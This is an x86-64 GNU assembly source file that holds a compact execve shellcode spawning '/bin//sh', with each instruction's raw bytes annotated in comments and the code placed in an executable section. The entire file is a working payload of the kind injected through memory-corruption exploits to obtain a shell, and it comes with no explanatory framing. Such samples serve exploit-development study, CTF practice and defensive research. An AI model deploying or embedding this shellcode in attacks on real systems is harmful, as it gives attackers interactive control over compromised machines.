    .section .shcode, "ax", @progbits
    .globl main
    .hidden main
    .type main, @function
main:
    /* 31 c0                         */  xor     %eax, %eax /* rax = 0 */
    /* 99                            */  cltd               /* rdx = 0 */
    /* 52                            */  push    %rdx
    /* 48 bb 2f 62 69 6e 2f 2f 73 68 */  movabs  $0x68732f2f6e69622f, %rbx
    /* 53                            */  push    %rbx
    /* 54                            */  push    %rsp
    /* 5f                            */  pop     %rdi       /* rdi = "/bin//sh" */
    /* 52                            */  push    %rdx
    /* 57                            */  push    %rdi
    /* 54                            */  push    %rsp
    /* 5e                            */  pop     %rsi       /* rsi = [rdi, NULL] */
    /* b0 3b                         */  mov     $0x3b, %al /* eax = 59 = __NR_execve */
    /* 0f 05                         */  syscall            /* syscall(eax, rdi, rsi, rdx) */

/* Mark the stack as not executable */
    .section .note.GNU-stack, "", @progbits
